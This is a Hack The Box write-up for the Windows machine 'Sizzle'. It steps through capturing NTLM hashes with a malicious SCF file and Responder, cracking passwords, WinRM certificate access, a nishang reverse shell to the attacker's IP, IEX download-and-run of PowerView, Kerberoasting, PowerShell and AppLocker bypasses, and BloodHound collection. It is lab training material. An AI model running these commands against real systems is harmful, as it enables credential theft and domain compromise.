@@ -1,0 +1,671 @@
+---
+layout: default
+title: Sizzle
+---
+
+<h1>Sizzle</h1>
+<p class="date">01/06/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/sizzle.png">
+
+<p>Sizzle is a very complex machine but great to learn a lot about Windows services and Active Directory. To get user we'll have to perform a <code>scf</code> attack, then use <code>winrm</code> to get access to the machine where we'll have to bypass some restrictions to execute a <code>kerberoast</code> attack. Then, to escalate privileges, retrieve Active Directory information using <code>BloodHound</code> and finally use <code>mimikatz</code> to get the Administrator's password.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> to identify what services are running in the machine. Note that I directly used <code>-p-</code> to check <b>all</b> ports, because we are going to need some services which are hidden in the default scan.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/sizzle# nmap -sC -sV -p- 10.10.10.103
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-24 17:31 EDT
+Nmap scan report for 10.10.10.103
+Host is up (0.067s latency).
+Not shown: 65506 filtered ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-03-24T21:39:06+00:00; 0s from scanner time.
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-03-24T21:39:03+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-03-24T21:39:05+00:00; -1s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-03-24T21:39:04+00:00; -1s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-03-24T21:39:03+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername:&lt;unsupported>, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2018-07-02T20:26:23
+|_Not valid after:  2019-07-02T20:26:23
+|_ssl-date: 2019-03-24T21:39:04+00:00; -1s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49683/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+60596/tcp open  msrpc         Microsoft Windows RPC
+60604/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=3/24%Time=5C97F874%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-03-24 17:39:02
+|_  start_date: 2019-03-24 13:03:51
+</pre>
+
+<p>We'll start enumerating the <code>smb</code> service, looking for available shares using <code>smbclient</code>.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# smbclient -L //10.10.10.103
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	CertEnroll      Disk      Active Directory Certificate Services share
+	Department Shares Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Operations      Disk      
+	SYSVOL          Disk      Logon server share 
+</pre>
+
+<p>If we connect to the <code>Department Shares</code> share we should see a bunch of directories (most of them empty or with nothing interesting).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# smbclient //10.10.10.103/"Department Shares"
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Jul  3 15:22:32 2018
+  ..                                  D        0  Tue Jul  3 15:22:32 2018
+  Accounting                          D        0  Mon Jul  2 19:21:43 2018
+  Audit                               D        0  Mon Jul  2 19:14:28 2018
+  Banking                             D        0  Tue Jul  3 15:22:39 2018
+  CEO_protected                       D        0  Mon Jul  2 19:15:01 2018
+  Devops                              D        0  Mon Jul  2 19:19:33 2018
+  Finance                             D        0  Mon Jul  2 19:11:57 2018
+  HR                                  D        0  Mon Jul  2 19:16:11 2018
+  Infosec                             D        0  Mon Jul  2 19:14:24 2018
+  Infrastructure                      D        0  Mon Jul  2 19:13:59 2018
+  IT                                  D        0  Mon Jul  2 19:12:04 2018
+  Legal                               D        0  Mon Jul  2 19:12:09 2018
+  M&A                                 D        0  Mon Jul  2 19:15:25 2018
+  Marketing                           D        0  Mon Jul  2 19:14:43 2018
+  R&D                                 D        0  Mon Jul  2 19:11:47 2018
+  Sales                               D        0  Mon Jul  2 19:14:37 2018
+  Security                            D        0  Mon Jul  2 19:21:47 2018
+  Tax                                 D        0  Mon Jul  2 19:16:54 2018
+  Users                               D        0  Tue Jul 10 21:39:32 2018
+  ZZ_ARCHIVE                          D        0  Fri Mar  1 11:27:54 2019
+</pre>
+
+<p>In <code>Users</code> we have a list of users (<code>mrb3n</code> & <code>lkys37en</code> are the machine makers). We can also see we can upload files to the <code>Public</code> folder.</p>
+
+<pre class="prettyprint">
+smb: \> ls Users\
+  .                                   D        0  Tue Jul 10 21:39:32 2018
+  ..                                  D        0  Tue Jul 10 21:39:32 2018
+  amanda                              D        0  Mon Jul  2 19:18:43 2018
+  amanda_adm                          D        0  Mon Jul  2 19:19:06 2018
+  bill                                D        0  Mon Jul  2 19:18:28 2018
+  bob                                 D        0  Mon Jul  2 19:18:31 2018
+  chris                               D        0  Mon Jul  2 19:19:14 2018
+  henry                               D        0  Mon Jul  2 19:18:39 2018
+  joe                                 D        0  Mon Jul  2 19:18:34 2018
+  jose                                D        0  Mon Jul  2 19:18:53 2018
+  lkys37en                            D        0  Tue Jul 10 21:39:04 2018
+  morgan                              D        0  Mon Jul  2 19:18:48 2018
+  mrb3n                               D        0  Mon Jul  2 19:19:20 2018
+  Public                              D        0  Wed Sep 26 05:45:32 2018
+</pre>
+
+<p>We're going to make a <code>scf</code> attack, using the following file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# cat @caca.scf 
+[Shell]
+Command=2
+IconFile=\\10.10.16.72\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+</pre>
+
+<p>If we start <code>responder</code> and upload the malicious file to <code>\Users\Public</code>, when a user accesses the specified folder it will start the <code>smb</code> authentication protocol sending his <code>ntlm</code> hash.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 2.3.3.9
+</pre>
+
+<pre class="prettyprint">
+smb: \Users\Public\> put caca.scf 
+putting file caca.scf as \Users\Public\caca.scf (0.4 kb/s) (average 0.2 kb/s)
+</pre>
+
+<p>If we wait a couple of minutes, we'll see Amanda visits that directory and her hash should appear in the <code>responder</code> output.</p>
+
+<pre class="prettyprint">
+[+] Listening for events...
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
+[SMBv2] NTLMv2-SSP Username : HTB\amanda
+[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:1f5c11bc27af7925:737BD313547050096AB59DB727CBC99A:0101000000000000C0653150DE09D20179E68D8D9A8C0976000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000C4753E45C5EDA1B2FD5D927D07DCD98218205A44FCD7B75F7FE1E52D5A41EAFD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0032003300000000000000000000000000
+</pre>
+
+<p>We can brute force it using <code>john</code> and <code>rockyou.txt</code> and obtain the password <code>Ashare1972</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ashare1972       (amanda)
+1g 0:00:00:07 DONE (2019-03-20 16:45) 0.1324g/s 1513Kp/s 1513Kc/s 1513KC/s Ashiah08..Alyssatao
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+</pre>
+
+<p>Having those credentials, let's move forward to the website on port <code>80</code>, where we'll only see the following picture.</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/sizzle.gif">
+
+<p>Let's use <code>wfuzz</code> to find some web content.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.103/FUZZ --hc 404
+
+********************************************************
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.103/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=200      0 L        5 W       60 Ch    ""
+000493:  C=301      1 L       10 W      157 Ch    "aspnet_client"
+000800:  C=301      1 L       10 W      154 Ch    "certenroll"
+000807:  C=401     29 L      100 W     1293 Ch    "certsrv"
+001992:  C=301      1 L       10 W      150 Ch    "Images"
+001991:  C=301      1 L       10 W      150 Ch    "images"
+002020:  C=200      0 L        5 W       60 Ch    "index.html"
+</pre>
+
+<p>In <code>/certsrv</code> we are prompted with a login. There, we can use the credentials obtained before (<code>amanda/Ashare1972</code>) and we'll be redirected to the <i>Microsoft Active Directory Certificate Services</i>.</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/1.png">
+
+<p>In this site we have different options to manage certificates and what we're going to do is request a new one clicking in <i>Request a certificate</i> and then submit an <i>advanced certificate request</i>.</p> 
+
+<img class="img-fluid" src="/static/img/htb/sizzle/2.png">
+
+<p>Here we are asked to submit our certificate request so let's generate one with <code>openssl</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# openssl req -new -newkey rsa:2048 -nodes -keyout caca.key -out caca.csr
+Generating a RSA private key
+...................................+++++
+..........................................................+++++
+writing new private key to 'caca.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+
+Please enter the following 'extra' attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+</pre>
+
+<p>This command is going to generate two files:</p>
+<ul>
+  <li>A certificate Signing Request (<code>caca.csr</code>)</li>
+  <li>The private key (<code>caca.key</code>)</li>
+</ul>
+
+<p>Now in the website we have to paste our <code>csr</code> and select <code>Usercert</code> as template.</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/3.png">
+
+<p>This will generate a valid certificate (<code>certnew.cer</code>) which we can download.</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/4.png">
+
+<p>What we can do with this certificate? The answer is in our initial <code>nmap</code>. In port <code>5986</code> we have Windows Remote Management (<code>WinRM</code>) running. This service allows to interface remote computers through <code>SOAP</code> and there's an option to authenticate through a certificate.</p>
+
+<p>I tried to use the <code>pywinrm</code> python module but I didn't make it to work. Lucky me, searching in Google I found <a href="https://pastebin.com/uGq0xTxS" target="_blank">this pastebin</a> with an example on how to use the <code>winrm</code> ruby module, so I modified it a little specifying our certificate and private key and ended up with this. (Thanks pastebin guest!)</p> 
+
+<pre class="prettyprint">
+require 'winrm'
+ 
+conn = WinRM::Connection.new(
+    endpoint: 'https://10.10.10.103:5986/wsman',
+    transport: :ssl,
+    client_cert: 'certnew.cer',
+    client_key: 'caca.key',
+:no_ssl_peer_verification => true
+)
+command=""
+ 
+conn.shell(:powershell) do |shell|
+    until command == "exit\n" do
+        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
+        print(output.output.chomp)
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts "Exiting with code #{output.exitcode}"
+end
+</pre>
+
+<p>Executing it should allow us to run powershell commands as amanda.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# ruby pipi.rb 
+PS htb\amanda@SIZZLE Documents> 
+</pre>
+
+<p>We're going to execute a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">nishang reverse shell</a> which we have modified to execute a reverse shell to us adding the following line at the end.</p>
+
+<pre class="prettyprint">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.72 -Port 6969</pre> 
+
+<p>But unfortunately we get the following error when trying to load it.</p>
+
+<pre class="prettyprint">
+PS htb\amanda@SIZZLE Documents> IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/shell6969.ps1')
+Cannot create type. Only core types are supported in this language mode.
+At line:1 char:5
++ IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/shel ...
++     ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException
+    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
+</pre>
+
+<p>We are under Constrained Language mode, which disables a lot of powershell capabilities.</p>
+
+<pre class="prettyprint">
+PS htb\amanda@SIZZLE Documents> $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+</pre>
+
+<p>We can use <code>wget</code> to download our nishang shell, instead.</p>
+
+<pre class="prettyprint">
+PS htb\amanda@SIZZLE Documents> wget http://10.10.16.72/shell6969.ps1 -OutFile shell6969.ps1
+</pre>
+
+<p>But we get the same error when trying to execute it.</p>
+
+<pre class="prettyprint">
+PS htb\amanda@SIZZLE Documents> powershell -ExecutionPolicy Bypass C:\Users\amanda\Documents\shell6969.ps1
+WARNING: Something went wrong! Check if the server is reachable and you are using the correct 
+port.
+powershell.exe : Invoke-PowerShellTcp : Cannot create type. Only core types are supported in this language mode.
+    + CategoryInfo          : NotSpecified: (Invoke-PowerShe... language mode.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+At C:\Users\amanda\Documents\shell6969.ps1:127 char:1
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.72 -Port 6969
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShell 
+   Tcp
+</pre>
+
+<p>We can bypass this restriction just by running PowWrshell version 2 instead.</p>
+
+<pre class="prettyprint">
+PS htb\amanda@SIZZLE Documents> powershell -v 2 -ExecutionPolicy Bypass C:\Users\amanda\Documents\shell6969.ps1
+</pre>
+
+<p>If we're listening on the specified port we should get a shell as amanda with <i>FullLanguage</i>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# nc -nlvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.72] from (UNKNOWN) [10.10.10.103] 62150
+Windows PowerShell running as user amanda on SIZZLE
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\amanda\Documents>$ExecutionContext.SessionState.LanguageMode
+FullLanguage
+</pre>
+
+<p>There, using <code>setspn</code> we can extract all accounts in use as SPN to see we can make a kerberoasting attack against <code>mrlky</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\amanda\Downloads> setspn -T HTB.LOCAL -Q */*
+Checking domain DC=HTB,DC=LOCAL
+CN=SIZZLE,OU=Domain Controllers,DC=HTB,DC=LOCAL
+  Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/sizzle.HTB.LOCAL
+  ldap/sizzle.HTB.LOCAL/ForestDnsZones.HTB.LOCAL
+  ldap/sizzle.HTB.LOCAL/DomainDnsZones.HTB.LOCAL
+  DNS/sizzle.HTB.LOCAL
+  GC/sizzle.HTB.LOCAL/HTB.LOCAL
+  RestrictedKrbHost/sizzle.HTB.LOCAL
+  RestrictedKrbHost/SIZZLE
+  RPC/717ef311-0653-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL
+  HOST/SIZZLE/HTB
+  HOST/sizzle.HTB.LOCAL/HTB
+  HOST/SIZZLE
+  HOST/sizzle.HTB.LOCAL
+  HOST/sizzle.HTB.LOCAL/HTB.LOCAL
+  E3514235-4B06-11D1-AB04-00C04FC2DCD2/717ef311-0653-41c6-8db6-81526d6f4985/HTB.LOCAL
+  ldap/SIZZLE/HTB
+  ldap/717ef311-0653-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL
+  ldap/sizzle.HTB.LOCAL/HTB
+  ldap/SIZZLE
+  ldap/sizzle.HTB.LOCAL
+  ldap/sizzle.HTB.LOCAL/HTB.LOCAL
+CN=krbtgt,CN=Users,DC=HTB,DC=LOCAL
+  kadmin/changepw
+CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+  http/sizzle
+
+Existing SPN found!
+</pre>
+
+<p>We're going to use <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank"><code>PowerView</code></a> to execute the <code>kerberoast</code> attack.</p>
+
+<pre class="prettyprint">
+PS C:\Users\amanda\Documents>IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/PowerView.ps1')
+</pre>
+
+<p>Run the attack passing <code>amanda</code>'s credentials and we get <code>mrlky</code> hash.</p>
+
+<pre class="prettyprint">
+PS C:\Users\amanda\Documents> $SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
+PS C:\Users\amanda\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $SecPassword)
+PS C:\Users\amanda\Documents> Invoke-Kerberoast -Credential $Cred -Verbose | fl
+
+
+SamAccountName       : mrlky
+DistinguishedName    : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+ServicePrincipalName : http/sizzle
+TicketByteHexStream  : 
+Hash                 : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$69FF7FEF1F537E91C10B47A3EB9EB809$
+                       A2989EBF265226858132B7E0F08658706F87601BAAA6FA6BD3FA971214E727E650DD2BEFD9A
+                       FAF46D0A6D1D0489E26F5FAFAF24056C785C99764F23BFD326E4B5EB9A8DAD7586C41478091
+                       43801C6ADF3EF0618C205E9313103C17896AF6841818D4BBEF73FD68B8E1257CAFEF6286CA1
+                       7F65EF531A75A657078C3CB80AD7EDFB8DACD8E2CE490EEC0D89B8B62650E5E3B41055639E2
+                       AB3396411950BC533E3C5E081B053AB25FFFF36485492B0F6CA061D238309590836D96F0616
+                       204FE708A1E1EDD173B0C10D2C071899A63EB0BB82D4E61D7363C30BD82E0DFDFC07EA11D18
+                       37C98CD5047B8744FFCBB4B00C9B0D916BFF87DD68A1F22E28232ECA337270CEB922F076651
+                       D602820592BC652F56BC78C5D57ADBC8C72694551B1698EE5650BA2225267A5C0971E1927E2
+                       15F6DBBC76412C61C7735FA78104EECCF38ACF5E2808CE4CFD4B6D7E87BBA58DF658F7589E3
+                       EEE4F45C2062B1C368318309647A37D8F59F09367167513BAC8B35B4E572854A30DE9BB887F
+                       94D3985552B53A0A396A6FAD5211580E3C46C2045696418734C316BFE62B785F311B667E74A
+                       9FD22C5263F564E4ACD2EF1B75EA1B74B6F39FB0454D831F1187E9F6F57BE3AD6FCA4FA2B79
+                       941D2F3BEF3CB5B6466950587907EF1D88ED7B9D98909660D7EC557E2E3A207B2DDAA75017C
+                       B5B1BB304854633D3CF21E92CA1B313257A8FF3103BF937E1165CA9C583EFD2B9F0F9AA5AE1
+                       70C8D46D1FA846BBE67B622E746B90318D5257895C27EA060B36ACD01D84230B024BD4AD5D4
+                       D57C670FAC0308840C8CDCEB35D25FEF6589857425990989204C14E901948C6D49007E89C8F
+                       7849AC9264F734E7CB269F6BDE51EAECF30F33C21F2812D95E277C46361BFF04C72E07D18B6
+                       B79EBC1C4DA3126A801212A52FB005EC35FD46DBDF0FAB15CB521898E47547822488A1C4D32
+                       992E9DC7ED03F57B5A16BC3723F0FE9E9E6DC66240930F7E414FFD161FB272118966705BAED
+                       64F4CF7ABC978A41406AA00E6B4C72A67FFD6340EE5C0BDC2D036AA8F1B08B7BDC5D25AFAB3
+                       0397E0E78350B0CC4ECB65FC38683D6ACCF6D0FA3BDF301E91E1939F8B3B8310BBFC7E06255
+                       7F24DFC508ED083F84BDCAA84CDDA1C48A87863351DCC72EBE89493FA2B5C30F6AEA45A7145
+                       0DE09F79647C0645402BEC7DDD0225AF7A4235C2F050264464A7A9E4C728C0B9BC1DDE7DB49
+                       34550F56F3DD3DFCB2511861722076524C4BD3F8125CC9511312DDC48EF7BCBB9DCED70CFED
+                       1F79B9D209C019CA9990EEF96B37704973263C31A507701CCB71B08CEFB662A3FFBBCDECA6D
+                       0A4D33B1EBC31045AF6AA86C9B029DBCD86780930AA41BF54ADC0618F1A5ED04D08A4FCCFE6
+                       E1577DB55BF924992AC3FAF9225F4CCB1D66CC
+</pre>
+
+<p>Running <code>john</code> again with <code>rockyou.txt</code> will give us mrkly's password (<code>Football#7</code>).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# john mrlky.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Football#7       (?)
+1g 0:00:00:28 DONE (2019-03-25 17:29) 0.03461g/s 386560p/s 386560c/s 386560C/s Forever3!..Flubb3r
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</pre>
+
+<p>If we try to run a reverse shell using those credentials we get an error related to winrm permissions.</p>
+
+<pre class="prettyprint">
+PS C:\Users\amanda\Downloads> $username = 'mrlky'
+PS C:\Users\amanda\Downloads> $password = 'Football#7'
+PS C:\Users\amanda\Downloads> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Users\amanda\Downloads> $cred = New-Object System.Management.Automation.PSCredential $username, $securePassword 
+PS C:\Users\amanda\Downloads> Invoke-Command -ScriptBlock {powershell C:\Users\amanda\Downloads\shell6868.ps1} -Credential $cred -computername localhost
+PS C:\Users\amanda\Downloads> [localhost] Connecting to remote server failed with the following error message : The WinRM client
+ cannot process the request. The WinRM client tried to use Negotiate authentication mechanism, but
+ the destination computer (localhost:5985) returned an 'access denied' error. Change the configura
+tion to allow Negotiate authentication mechanism to be used or specify one of the authentication m
+echanisms supported by the server. To use Kerberos, specify the local computer name as the remote 
+destination. Also verify that the client computer and the destination computer are joined to a dom
+ain. To use Basic, specify the local computer name as the remote destination, specify Basic authen
+tication and provide user name and password. Possible authentication mechanisms reported by server
+: For more information, see the about_Remote_Troubleshooting Help topic.
+    + CategoryInfo          : OpenError: (:) [], PSRemotingTransportException
+    + FullyQualifiedErrorId : PSSessionStateBroken
+</pre>
+
+<p>So I used <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Impersonaliza-User.ps1" target="_blank"><code>Impersonaliza-User.ps1</code></a> script to change user to <code>mrlky</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\amanda\Documents> IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/Impersonaliza-User.ps1')
+PS C:\Users\amanda\Documents> Impersonaliza-User -usuario mrlky -password Football#7 -dominio HTB.LOCAL
+0
+True
+</pre>
+
+<p>The user flag is in <code>mrlky</code>'s desktop.</p>
+
+<pre class="prettyprint">
+PS C:\Users\mrlky\Desktop> type user.txt
+<span flag="a6ca1f8ee9e3bff02e0ed918f9db1310">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>To escalate privileges, first we're going to retrieve information about the active directory using <code>bloodhound</code>. To do that, download its ingestor <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe" target="_blank">here</a>.</p>
+
+<p>Unfortunately, if we try to run it we'll see we get the executable blocked by <code>AppLocker</code>, but we can bypass this by just placing our exe in <code>C:\Windows\System32\spool\drivers\color\</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\mrlky\Downloads> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.72/SharpHound.exe","C:\Windows\System32\spool\drivers\color\SharpHound.exe")
+</pre>
+
+<p>Run it, and it should generate a <code>zip</code> file with all the information extracted.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\System32\spool\drivers\color> ./SharpHound.exe --CollectionMethod All
+Initializing BloodHound at 4:40 PM on 5/31/2019
+Resolved Collection Methods to Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM
+Starting Enumeration for HTB.LOCAL
+Status: 61 objects enumerated (+61 Infinity/s --- Using 52 MB RAM )
+Finished enumeration for HTB.LOCAL in 00:00:00.5125315
+0 hosts failed ping. 0 hosts timedout.
+
+Compressing data to .\20190531164046_BloodHound.zip.
+You can upload this file directly to the UI.
+Finished compressing files!
+</pre>
+
+<p>Now move the <code>zip</code> file to <code>C:\Department Shares\ZZ_ARCHIVE\</code> to be able to download it via <code>smb</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\amanda\Documents>move C:\Windows\System32\spool\drivers\color\20190531164046_BloodHound.zip "C:\Department Shares\ZZ_ARCHIVE\caca.zip"
+</pre>
+
+<pre class="prettyprint">
+smb: \ZZ_ARCHIVE\> get caca.zip
+getting file \ZZ_ARCHIVE\caca.zip of size 7399 as caca.zip (11.1 KiloBytes/sec) (average 11.1 KiloBytes/sec)
+</pre>
+
+<p>Open <code>bloodhoud</code> and we just have to drag and drop the file there.</p>
+
